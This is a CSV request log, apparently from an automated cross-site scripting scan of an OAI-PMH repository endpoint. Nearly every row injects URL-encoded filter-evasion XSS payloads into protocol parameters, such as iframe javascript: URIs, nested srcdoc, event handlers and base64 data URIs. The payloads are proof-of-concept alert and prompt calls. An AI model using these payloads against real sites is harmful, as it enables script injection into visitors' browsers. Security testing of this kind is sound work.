uuid,timestamp,http_status_code,request_url,response_time,http_version
71dbe48e-fc7b-4eae-967e-3901bee35a48,2025-01-28 15:01:20,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=oai_dc&from=%3Ciframe+src%3Dj%26Tab%3Ba%26Tab%3Bv%26Tab%3Ba%26Tab%3Bs%26Tab%3Bc%26Tab%3Br%26Tab%3Bi%26Tab%3Bp%26Tab%3Bt%26Tab%3B%3Aa%26Tab%3Bl%26Tab%3Be%26Tab%3Br%26Tab%3Bt%26Tab%3B%2528%26Tab%3B1%26Tab%3B%2529%3E%3C%2Fiframe%3E,123.92 ms,HTTP/1.1
1c420e95-57fe-4103-805f-7545e3957488,2025-01-28 15:01:20,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%3Ciframe+src%3Dj%26Tab%3Ba%26Tab%3Bv%26Tab%3Ba%26Tab%3Bs%26Tab%3Bc%26Tab%3Br%26Tab%3Bi%26Tab%3Bp%26Tab%3Bt%26Tab%3B%3Aa%26Tab%3Bl%26Tab%3Be%26Tab%3Br%26Tab%3Bt%26Tab%3B%2528%26Tab%3B1%26Tab%3B%2529%3E%3C%2Fiframe%3E&metadataPrefix=oai_dc,50.96 ms,HTTP/1.1
b0e00a0f-9fef-4747-aadb-2b8d58bc44ab,2025-01-28 15:01:21,200,http://islandora.io/oai/request?verb=%3Ciframe+src%3Djavascript%26colon%3Balert%26lpar%3Bdocument%26period%3Blocation%26rpar%3B%3E,67.33 ms,HTTP/1.1
8b46616b-365b-44f7-b4be-b33ad57b61af,2025-01-28 15:01:21,200,http://islandora.io/oai/request?verb=ListMetadataFormats,45.13 ms,HTTP/1.1
b9328af7-6f1c-40e6-9ccd-c4845903168d,2025-01-28 15:01:21,200,http://islandora.io/oai/request?verb=ListSets&resumptionToken=%3Ciframe+src%3Djavascript%26colon%3Balert%26lpar%3Bdocument%26period%3Blocation%26rpar%3B%3E,59.04 ms,HTTP/1.1
44c9b919-755d-425a-aeb1-70eeb9081b56,2025-01-28 15:01:22,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&from=%3Ciframe+src%3Djavascript%26colon%3Balert%26lpar%3Bdocument%26period%3Blocation%26rpar%3B%3E&set=%3Ciframe+src%3Djavascript%26colon%3Balert%26lpar%3Bdocument%26period%3Blocation%26rpar%3B%3E,62.90 ms,HTTP/1.1
18289821-8ce9-4cb8-8223-3d0d7651bd68,2025-01-28 15:01:22,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=oai_dc&until=%3Ciframe+src%3Djavascript%26colon%3Balert%26lpar%3Bdocument%26period%3Blocation%26rpar%3B%3E,43.23 ms,HTTP/1.1
027555da-789c-4c8d-a3fe-aec29287714e,2025-01-28 15:01:22,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%3Ciframe+src%3Djavascript%26colon%3Balert%26lpar%3Bdocument%26period%3Blocation%26rpar%3B%3E&metadataPrefix=oai_dc,62.41 ms,HTTP/1.1
8dd86fb3-a65f-48fe-ba94-87334b7f91b9,2025-01-28 15:01:23,200,http://islandora.io/oai/request?verb=%3Ciframe+srcdoc%3D%22%26LT%3Biframe%26sol%3Bsrcdoc%3D%26amp%3Blt%3Bimg%26sol%3Bsrc%3D%26amp%3Bapos%3B%26amp%3Bapos%3Bonerror%3Djavascript%3Aalert%281%29%26amp%3Bgt%3B%3E%22%3E,53.26 ms,HTTP/1.1
6220f540-9df5-4883-bac6-f7bc4d22002e,2025-01-28 15:01:23,200,http://islandora.io/oai/request?verb=ListMetadataFormats&identifier=%3Ciframe+srcdoc%3D%22%26LT%3Biframe%26sol%3Bsrcdoc%3D%26amp%3Blt%3Bimg%26sol%3Bsrc%3D%26amp%3Bapos%3B%26amp%3Bapos%3Bonerror%3Djavascript%3Aalert%281%29%26amp%3Bgt%3B%3E%22%3E,53.76 ms,HTTP/1.1
0e1a8d6a-c4b2-496f-bf02-21a0a3f0a599,2025-01-28 15:01:24,200,http://islandora.io/oai/request?verb=ListSets,55.00 ms,HTTP/1.1
82286785-3eff-41e3-b53b-804a5158c2b6,2025-01-28 15:01:24,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=marc&from=%3Ciframe+srcdoc%3D%22%26LT%3Biframe%26sol%3Bsrcdoc%3D%26amp%3Blt%3Bimg%26sol%3Bsrc%3D%26amp%3Bapos%3B%26amp%3Bapos%3Bonerror%3Djavascript%3Aalert%281%29%26amp%3Bgt%3B%3E%22%3E&set=%3Ciframe+srcdoc%3D%22%26LT%3Biframe%26sol%3Bsrcdoc%3D%26amp%3Blt%3Bimg%26sol%3Bsrc%3D%26amp%3Bapos%3B%26amp%3Bapos%3Bonerror%3Djavascript%3Aalert%281%29%26amp%3Bgt%3B%3E%22%3E,72.12 ms,HTTP/1.1
35c5dad2-9b2e-424b-9a49-4eee583d646d,2025-01-28 15:01:24,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=marc&set=%3Ciframe+srcdoc%3D%22%26LT%3Biframe%26sol%3Bsrcdoc%3D%26amp%3Blt%3Bimg%26sol%3Bsrc%3D%26amp%3Bapos%3B%26amp%3Bapos%3Bonerror%3Djavascript%3Aalert%281%29%26amp%3Bgt%3B%3E%22%3E,55.91 ms,HTTP/1.1
79b2af5b-275d-43d7-8a19-65f49c6798ee,2025-01-28 15:01:25,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%3Ciframe+srcdoc%3D%22%26LT%3Biframe%26sol%3Bsrcdoc%3D%26amp%3Blt%3Bimg%26sol%3Bsrc%3D%26amp%3Bapos%3B%26amp%3Bapos%3Bonerror%3Djavascript%3Aalert%281%29%26amp%3Bgt%3B%3E%22%3E&metadataPrefix=marc,74.04 ms,HTTP/1.1
15bbec67-8c07-416b-8dbd-a021d4feb76a,2025-01-28 15:01:25,200,http://islandora.io/oai/request?verb=%3Ciframe+srcdoc%3D%27%26lt%3Bbody+onload%3Dprompt%26lpar%3B1%26rpar%3B%26gt%3B%27%3E,67.31 ms,HTTP/1.1
d1a0525c-084c-405e-8a40-bb5f2d922e82,2025-01-28 15:01:25,200,http://islandora.io/oai/request?verb=ListMetadataFormats&identifier=%3Ciframe+srcdoc%3D%27%26lt%3Bbody+onload%3Dprompt%26lpar%3B1%26rpar%3B%26gt%3B%27%3E,68.89 ms,HTTP/1.1
44947081-87cb-44f3-8eb2-de7d516bc47d,2025-01-28 15:01:26,200,http://islandora.io/oai/request?verb=ListSets&resumptionToken=%3Ciframe+srcdoc%3D%27%26lt%3Bbody+onload%3Dprompt%26lpar%3B1%26rpar%3B%26gt%3B%27%3E,46.79 ms,HTTP/1.1
7edd7df3-210a-46a9-b82f-779dec4699b9,2025-01-28 15:01:26,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=marc&until=%3Ciframe+srcdoc%3D%27%26lt%3Bbody+onload%3Dprompt%26lpar%3B1%26rpar%3B%26gt%3B%27%3E,62.74 ms,HTTP/1.1
2e949e23-12de-4de4-b1cd-bec50d89169d,2025-01-28 15:01:27,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=marc&from=%3Ciframe+srcdoc%3D%27%26lt%3Bbody+onload%3Dprompt%26lpar%3B1%26rpar%3B%26gt%3B%27%3E,64.11 ms,HTTP/1.1
f533c4df-1c8d-4df2-b3fb-e9335e4ca052,2025-01-28 15:01:27,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%3Ciframe+srcdoc%3D%27%26lt%3Bbody+onload%3Dprompt%26lpar%3B1%26rpar%3B%26gt%3B%27%3E&metadataPrefix=marc,50.55 ms,HTTP/1.1
3e8aacdc-8b03-4c06-9ad3-76a1417b400b,2025-01-28 15:01:27,200,http://islandora.io/oai/request?verb=%3Ciframe+style%3D%22position%3Aabsolute%3Btop%3A0%3Bleft%3A0%3Bwidth%3A100%25%3Bheight%3A100%25%22+onmouseover%3D%22prompt%281%29%22%3E,59.47 ms,HTTP/1.1
b5da7efa-f617-411f-87ae-98b6ccd77164,2025-01-28 15:01:28,200,http://islandora.io/oai/request?verb=ListMetadataFormats,33.33 ms,HTTP/1.1
1bb9d612-d0cf-4b8a-b9f4-af22968e4c36,2025-01-28 15:01:28,200,http://islandora.io/oai/request?verb=ListSets&resumptionToken=%3Ciframe+style%3D%22position%3Aabsolute%3Btop%3A0%3Bleft%3A0%3Bwidth%3A100%25%3Bheight%3A100%25%22+onmouseover%3D%22prompt%281%29%22%3E,72.07 ms,HTTP/1.1
99fb62b1-09ba-47c6-89ef-02fa77ac7bc6,2025-01-28 15:01:28,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&set=%3Ciframe+style%3D%22position%3Aabsolute%3Btop%3A0%3Bleft%3A0%3Bwidth%3A100%25%3Bheight%3A100%25%22+onmouseover%3D%22prompt%281%29%22%3E,68.78 ms,HTTP/1.1
19d27cc7-a163-44d1-b3ff-cf95d08714fa,2025-01-28 15:01:29,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=oai_dc&from=%3Ciframe+style%3D%22position%3Aabsolute%3Btop%3A0%3Bleft%3A0%3Bwidth%3A100%25%3Bheight%3A100%25%22+onmouseover%3D%22prompt%281%29%22%3E,119.99 ms,HTTP/1.1
621a9885-18ab-4c68-bf8c-fe23b7ada6cb,2025-01-28 15:01:29,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%3Ciframe+style%3D%22position%3Aabsolute%3Btop%3A0%3Bleft%3A0%3Bwidth%3A100%25%3Bheight%3A100%25%22+onmouseover%3D%22prompt%281%29%22%3E&metadataPrefix=marc,46.65 ms,HTTP/1.1
2f118e62-03b3-425b-aa14-a5ce6482300a,2025-01-28 15:01:29,200,http://islandora.io/oai/request?verb=%3Ciframe+style%3D%22xg-p%3Aabsolute%3Btop%3A0%3Bleft%3A0%3Bwidth%3A100%25%3Bheight%3A100%25%22+onmouseover%3D%22prompt%281%29%22%3E,66.95 ms,HTTP/1.1
2bb50c12-63ca-4139-8993-3d5139711cf8,2025-01-28 15:01:30,200,http://islandora.io/oai/request?verb=ListMetadataFormats,46.82 ms,HTTP/1.1
db3b41b1-92bb-43f6-a825-1466bd90283b,2025-01-28 15:01:30,200,http://islandora.io/oai/request?verb=ListSets,46.50 ms,HTTP/1.1
6ae4edb9-abf6-41b8-bc16-8382641d20e4,2025-01-28 15:01:31,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&from=%3Ciframe+style%3D%22xg-p%3Aabsolute%3Btop%3A0%3Bleft%3A0%3Bwidth%3A100%25%3Bheight%3A100%25%22+onmouseover%3D%22prompt%281%29%22%3E,72.20 ms,HTTP/1.1
9e0226af-bfaf-489e-b87f-4ac19afba918,2025-01-28 15:01:31,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=oai_dc&from=%3Ciframe+style%3D%22xg-p%3Aabsolute%3Btop%3A0%3Bleft%3A0%3Bwidth%3A100%25%3Bheight%3A100%25%22+onmouseover%3D%22prompt%281%29%22%3E&until=%3Ciframe+style%3D%22xg-p%3Aabsolute%3Btop%3A0%3Bleft%3A0%3Bwidth%3A100%25%3Bheight%3A100%25%22+onmouseover%3D%22prompt%281%29%22%3E&set=%3Ciframe+style%3D%22xg-p%3Aabsolute%3Btop%3A0%3Bleft%3A0%3Bwidth%3A100%25%3Bheight%3A100%25%22+onmouseover%3D%22prompt%281%29%22%3E,55.65 ms,HTTP/1.1
e66ab884-d1cb-45cc-86e9-f3fc9062e932,2025-01-28 15:01:31,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%3Ciframe+style%3D%22xg-p%3Aabsolute%3Btop%3A0%3Bleft%3A0%3Bwidth%3A100%25%3Bheight%3A100%25%22+onmouseover%3D%22prompt%281%29%22%3E&metadataPrefix=oai_dc,64.89 ms,HTTP/1.1
5de2fc1f-45c8-4866-8fad-32fd59760a5a,2025-01-28 15:01:32,200,http://islandora.io/oai/request?verb=%3Ciframe+xmlns%3D%22%23%22+src%3D%22javascript%3Aalert%281%29%22%3E%3C%2Fiframe%3E,72.41 ms,HTTP/1.1
3467b65e-073c-46c5-b4eb-6bc113946c79,2025-01-28 15:01:32,200,http://islandora.io/oai/request?verb=ListMetadataFormats&identifier=%3Ciframe+xmlns%3D%22%23%22+src%3D%22javascript%3Aalert%281%29%22%3E%3C%2Fiframe%3E,56.63 ms,HTTP/1.1
b178036f-eac5-45b2-a6bc-778e04c57f02,2025-01-28 15:01:32,200,http://islandora.io/oai/request?verb=ListSets&resumptionToken=%3Ciframe+xmlns%3D%22%23%22+src%3D%22javascript%3Aalert%281%29%22%3E%3C%2Fiframe%3E,61.74 ms,HTTP/1.1
c3e9afbf-564f-4a25-9f56-28ffd5e55b76,2025-01-28 15:01:33,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&from=%3Ciframe+xmlns%3D%22%23%22+src%3D%22javascript%3Aalert%281%29%22%3E%3C%2Fiframe%3E&until=%3Ciframe+xmlns%3D%22%23%22+src%3D%22javascript%3Aalert%281%29%22%3E%3C%2Fiframe%3E&set=%3Ciframe+xmlns%3D%22%23%22+src%3D%22javascript%3Aalert%281%29%22%3E%3C%2Fiframe%3E,54.94 ms,HTTP/1.1
9e7adebe-7e63-41eb-a44d-9f54305e7c50,2025-01-28 15:01:33,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=marc&from=%3Ciframe+xmlns%3D%22%23%22+src%3D%22javascript%3Aalert%281%29%22%3E%3C%2Fiframe%3E&until=%3Ciframe+xmlns%3D%22%23%22+src%3D%22javascript%3Aalert%281%29%22%3E%3C%2Fiframe%3E,66.09 ms,HTTP/1.1
4bad78c4-f37f-490b-ac92-1bcef9ca12fb,2025-01-28 15:01:34,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%3Ciframe+xmlns%3D%22%23%22+src%3D%22javascript%3Aalert%281%29%22%3E%3C%2Fiframe%3E&metadataPrefix=marc,71.70 ms,HTTP/1.1
beb297eb-7052-4926-9554-4cecdfd08609,2025-01-28 15:01:34,200,http://islandora.io/oai/request?verb=%3Ciframe%2F%2500%2F+src%3DjavaSCRIPT%26colon%3Balert%281%29,36.73 ms,HTTP/1.1
3bd2d15a-a704-4f9c-921b-7751e763a023,2025-01-28 15:01:34,200,http://islandora.io/oai/request?verb=ListMetadataFormats,47.20 ms,HTTP/1.1
079d080b-4ba1-4955-8480-b7b41b62d5e6,2025-01-28 15:01:35,200,http://islandora.io/oai/request?verb=ListSets&resumptionToken=%3Ciframe%2F%2500%2F+src%3DjavaSCRIPT%26colon%3Balert%281%29,65.74 ms,HTTP/1.1
aff9c93f-246f-42e3-aa41-a3984d2d7de1,2025-01-28 15:01:35,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc,72.72 ms,HTTP/1.1
fe1a47cf-4bd5-4b53-a197-6df1b8a35434,2025-01-28 15:01:35,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=marc&until=%3Ciframe%2F%2500%2F+src%3DjavaSCRIPT%26colon%3Balert%281%29,59.55 ms,HTTP/1.1
ce743b4d-9345-4ccd-bbe3-b0cecb2e828c,2025-01-28 15:01:36,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%3Ciframe%2F%2500%2F+src%3DjavaSCRIPT%26colon%3Balert%281%29&metadataPrefix=marc,57.46 ms,HTTP/1.1
30f01752-c46a-4083-a038-667a959b5ded,2025-01-28 15:01:36,200,http://islandora.io/oai/request?verb=%3Ciframe%2F%2F+src%3DjavaSCRIPT%26colon%3Balert%281%29,69.92 ms,HTTP/1.1
38c3bbaa-22ed-447a-860b-ddbce691cefa,2025-01-28 15:01:36,200,http://islandora.io/oai/request?verb=ListMetadataFormats,31.28 ms,HTTP/1.1
519292ab-078c-42f6-aa7a-e7e5ff1087c2,2025-01-28 15:01:37,200,http://islandora.io/oai/request?verb=ListSets&resumptionToken=%3Ciframe%2F%2F+src%3DjavaSCRIPT%26colon%3Balert%281%29,50.85 ms,HTTP/1.1
a3f7c353-0506-4366-94b5-484ac5663c88,2025-01-28 15:01:37,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=marc,49.98 ms,HTTP/1.1
f638574c-7f68-4d1f-8aa4-93c53cc0d9af,2025-01-28 15:01:38,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=marc&from=%3Ciframe%2F%2F+src%3DjavaSCRIPT%26colon%3Balert%281%29&set=%3Ciframe%2F%2F+src%3DjavaSCRIPT%26colon%3Balert%281%29,66.49 ms,HTTP/1.1
df57f88b-73d4-4e2a-95e7-d9f1df54aad1,2025-01-28 15:01:38,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%3Ciframe%2F%2F+src%3DjavaSCRIPT%26colon%3Balert%281%29&metadataPrefix=oai_dc,49.34 ms,HTTP/1.1
afa5f2ce-ba00-49ba-9d48-e8e6ac6ba408,2025-01-28 15:01:38,200,http://islandora.io/oai/request?verb=%3Ciframe%2Fonreadystatechange%3D%5Cu0061%5Cu006C%5Cu0065%5Cu0072%5Cu0074%28%27%5Cu0061%27%29+worksinIE%3E,61.09 ms,HTTP/1.1
97fd3d27-39d5-403a-a2a6-ab930e58c5f1,2025-01-28 15:01:39,200,http://islandora.io/oai/request?verb=ListMetadataFormats&identifier=%3Ciframe%2Fonreadystatechange%3D%5Cu0061%5Cu006C%5Cu0065%5Cu0072%5Cu0074%28%27%5Cu0061%27%29+worksinIE%3E,65.92 ms,HTTP/1.1
d67eeb67-161c-4a72-b73c-282ba5bfc875,2025-01-28 15:01:39,200,http://islandora.io/oai/request?verb=ListSets,50.56 ms,HTTP/1.1
d51c68af-5153-42c5-8b7b-a702c30eb4a6,2025-01-28 15:01:39,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=marc&from=%3Ciframe%2Fonreadystatechange%3D%5Cu0061%5Cu006C%5Cu0065%5Cu0072%5Cu0074%28%27%5Cu0061%27%29+worksinIE%3E&until=%3Ciframe%2Fonreadystatechange%3D%5Cu0061%5Cu006C%5Cu0065%5Cu0072%5Cu0074%28%27%5Cu0061%27%29+worksinIE%3E,55.14 ms,HTTP/1.1
760cabb1-b0ff-4dec-b747-f484c75b1679,2025-01-28 15:01:40,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=oai_dc&from=%3Ciframe%2Fonreadystatechange%3D%5Cu0061%5Cu006C%5Cu0065%5Cu0072%5Cu0074%28%27%5Cu0061%27%29+worksinIE%3E&until=%3Ciframe%2Fonreadystatechange%3D%5Cu0061%5Cu006C%5Cu0065%5Cu0072%5Cu0074%28%27%5Cu0061%27%29+worksinIE%3E,59.82 ms,HTTP/1.1
b8e3ba5d-70f0-4775-bf3d-0a570c0a20bc,2025-01-28 15:01:40,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%3Ciframe%2Fonreadystatechange%3D%5Cu0061%5Cu006C%5Cu0065%5Cu0072%5Cu0074%28%27%5Cu0061%27%29+worksinIE%3E&metadataPrefix=oai_dc,61.61 ms,HTTP/1.1
e2533ba3-1e9c-4e1d-8fe6-b70c7f0f8654,2025-01-28 15:01:40,200,http://islandora.io/oai/request?verb=%3Ciframe%2Fonreadystatechange%3Dalert%281%29,67.83 ms,HTTP/1.1
2497b8c1-aa14-4e30-bb90-fa4cf0ee98f2,2025-01-28 15:01:41,200,http://islandora.io/oai/request?verb=ListMetadataFormats&identifier=%3Ciframe%2Fonreadystatechange%3Dalert%281%29,55.76 ms,HTTP/1.1
39974dd6-036c-47b0-a369-a52f90be41b0,2025-01-28 15:01:41,200,http://islandora.io/oai/request?verb=ListSets&resumptionToken=%3Ciframe%2Fonreadystatechange%3Dalert%281%29,63.06 ms,HTTP/1.1
a05c1813-0f08-4694-aa58-79811faf762f,2025-01-28 15:01:42,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=marc&from=%3Ciframe%2Fonreadystatechange%3Dalert%281%29&set=%3Ciframe%2Fonreadystatechange%3Dalert%281%29,70.10 ms,HTTP/1.1
53e872b9-71b2-4682-94f9-83d100b15ef7,2025-01-28 15:01:42,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=oai_dc&set=%3Ciframe%2Fonreadystatechange%3Dalert%281%29,71.73 ms,HTTP/1.1
29d80002-7ba5-4e4e-bc08-7448108bacc8,2025-01-28 15:01:42,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%3Ciframe%2Fonreadystatechange%3Dalert%281%29&metadataPrefix=marc,53.32 ms,HTTP/1.1
6beb9789-9688-4d52-acb4-bb95e1e11c24,2025-01-28 15:01:43,200,http://islandora.io/oai/request?verb=%3Ciframe%2Fsrc+%5C%2F%5C%2Fonload+%3D+prompt%281%29,44.67 ms,HTTP/1.1
dd6be634-16d5-461d-b46d-14154039dacd,2025-01-28 15:01:43,200,http://islandora.io/oai/request?verb=ListMetadataFormats&identifier=%3Ciframe%2Fsrc+%5C%2F%5C%2Fonload+%3D+prompt%281%29,58.14 ms,HTTP/1.1
8ff7055f-1237-4565-972e-72e2c9bdaf3e,2025-01-28 15:01:43,200,http://islandora.io/oai/request?verb=ListSets&resumptionToken=%3Ciframe%2Fsrc+%5C%2F%5C%2Fonload+%3D+prompt%281%29,68.53 ms,HTTP/1.1
f593541d-7e5e-49ec-9fac-475162a522ff,2025-01-28 15:01:44,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=marc&set=%3Ciframe%2Fsrc+%5C%2F%5C%2Fonload+%3D+prompt%281%29,55.90 ms,HTTP/1.1
318c87ea-4b19-4ed4-ba9d-7588ff8405b9,2025-01-28 15:01:44,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=oai_dc&until=%3Ciframe%2Fsrc+%5C%2F%5C%2Fonload+%3D+prompt%281%29,61.07 ms,HTTP/1.1
7cdbe60d-f44a-4c6b-983b-29a46575e4bd,2025-01-28 15:01:44,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%3Ciframe%2Fsrc+%5C%2F%5C%2Fonload+%3D+prompt%281%29&metadataPrefix=marc,53.53 ms,HTTP/1.1
1f564032-24c0-4923-bbcf-d0a04adee13f,2025-01-28 15:01:45,200,http://islandora.io/oai/request?verb=%3Ciframe%2Fsrc%3D%22data%3Atext%2Fhtml%2C%3Csvg+%26%23111%3B%26%23110%3Bload%3Dalert%281%29%3E%22%3E,36.79 ms,HTTP/1.1
3701abe5-2a94-4d28-91d0-bc573b52b05f,2025-01-28 15:01:45,200,http://islandora.io/oai/request?verb=ListMetadataFormats&identifier=%3Ciframe%2Fsrc%3D%22data%3Atext%2Fhtml%2C%3Csvg+%26%23111%3B%26%23110%3Bload%3Dalert%281%29%3E%22%3E,49.48 ms,HTTP/1.1
a81611e3-72db-434d-aac7-decaf3510d80,2025-01-28 15:01:46,200,http://islandora.io/oai/request?verb=ListSets&resumptionToken=%3Ciframe%2Fsrc%3D%22data%3Atext%2Fhtml%2C%3Csvg+%26%23111%3B%26%23110%3Bload%3Dalert%281%29%3E%22%3E,59.75 ms,HTTP/1.1
64f45f90-9c6f-460c-812d-efff11ac5e4e,2025-01-28 15:01:46,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=marc&until=%3Ciframe%2Fsrc%3D%22data%3Atext%2Fhtml%2C%3Csvg+%26%23111%3B%26%23110%3Bload%3Dalert%281%29%3E%22%3E&set=%3Ciframe%2Fsrc%3D%22data%3Atext%2Fhtml%2C%3Csvg+%26%23111%3B%26%23110%3Bload%3Dalert%281%29%3E%22%3E,86.83 ms,HTTP/1.1
5129fa77-00b6-4958-af02-22fd7af35aef,2025-01-28 15:01:46,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=marc&from=%3Ciframe%2Fsrc%3D%22data%3Atext%2Fhtml%2C%3Csvg+%26%23111%3B%26%23110%3Bload%3Dalert%281%29%3E%22%3E&until=%3Ciframe%2Fsrc%3D%22data%3Atext%2Fhtml%2C%3Csvg+%26%23111%3B%26%23110%3Bload%3Dalert%281%29%3E%22%3E&set=%3Ciframe%2Fsrc%3D%22data%3Atext%2Fhtml%2C%3Csvg+%26%23111%3B%26%23110%3Bload%3Dalert%281%29%3E%22%3E,55.24 ms,HTTP/1.1
c0c8406a-bf26-4c10-82eb-3f84d068f0d8,2025-01-28 15:01:47,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%3Ciframe%2Fsrc%3D%22data%3Atext%2Fhtml%2C%3Csvg+%26%23111%3B%26%23110%3Bload%3Dalert%281%29%3E%22%3E&metadataPrefix=marc,64.80 ms,HTTP/1.1
d5ac003e-2216-4e65-841f-17c33d00f1e0,2025-01-28 15:01:47,200,http://islandora.io/oai/request?verb=%3Ciframe%2Fsrc%3D%22data%3Atext%2Fhtml%3B%26Tab%3Bbase64%26Tab%3B%2CPGJvZHkgb25sb2FkPWFsZXJ0KDEpPg%3D%3D%22%3E,64.53 ms,HTTP/1.1
d30d027e-2981-4adf-b33d-d09e881ae018,2025-01-28 15:01:47,200,http://islandora.io/oai/request?verb=ListMetadataFormats,43.92 ms,HTTP/1.1
af481837-8f1f-434d-a050-78cacf4b39ad,2025-01-28 15:01:48,200,http://islandora.io/oai/request?verb=ListSets&resumptionToken=%3Ciframe%2Fsrc%3D%22data%3Atext%2Fhtml%3B%26Tab%3Bbase64%26Tab%3B%2CPGJvZHkgb25sb2FkPWFsZXJ0KDEpPg%3D%3D%22%3E,71.96 ms,HTTP/1.1
bd7ccde3-ce82-4776-a816-39c047ac3438,2025-01-28 15:01:48,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&until=%3Ciframe%2Fsrc%3D%22data%3Atext%2Fhtml%3B%26Tab%3Bbase64%26Tab%3B%2CPGJvZHkgb25sb2FkPWFsZXJ0KDEpPg%3D%3D%22%3E&set=%3Ciframe%2Fsrc%3D%22data%3Atext%2Fhtml%3B%26Tab%3Bbase64%26Tab%3B%2CPGJvZHkgb25sb2FkPWFsZXJ0KDEpPg%3D%3D%22%3E,67.82 ms,HTTP/1.1
a6effcae-878b-4ccc-b260-efe20c178e13,2025-01-28 15:01:48,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=oai_dc&until=%3Ciframe%2Fsrc%3D%22data%3Atext%2Fhtml%3B%26Tab%3Bbase64%26Tab%3B%2CPGJvZHkgb25sb2FkPWFsZXJ0KDEpPg%3D%3D%22%3E&set=%3Ciframe%2Fsrc%3D%22data%3Atext%2Fhtml%3B%26Tab%3Bbase64%26Tab%3B%2CPGJvZHkgb25sb2FkPWFsZXJ0KDEpPg%3D%3D%22%3E,64.03 ms,HTTP/1.1
0a15f9b9-20bc-4d24-a66e-194ca8342209,2025-01-28 15:01:49,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%3Ciframe%2Fsrc%3D%22data%3Atext%2Fhtml%3B%26Tab%3Bbase64%26Tab%3B%2CPGJvZHkgb25sb2FkPWFsZXJ0KDEpPg%3D%3D%22%3E&metadataPrefix=oai_dc,63.79 ms,HTTP/1.1
f2460b97-a827-4be4-9166-36f908fcb51a,2025-01-28 15:01:49,200,http://islandora.io/oai/request?verb=%3Ciframe%3C%3Fphp+echo+chr%2811%29%3F%3E+onload%3Dalert%28%27XSS%27%29%3E%3C%2Fiframe%3E,56.92 ms,HTTP/1.1
48f5935a-0a08-4d91-ae00-cffdbc036a51,2025-01-28 15:01:50,200,http://islandora.io/oai/request?verb=ListMetadataFormats,54.98 ms,HTTP/1.1
f12d318d-dbaf-42e7-83ed-e79cee42b7c4,2025-01-28 15:01:50,200,http://islandora.io/oai/request?verb=ListSets,40.74 ms,HTTP/1.1
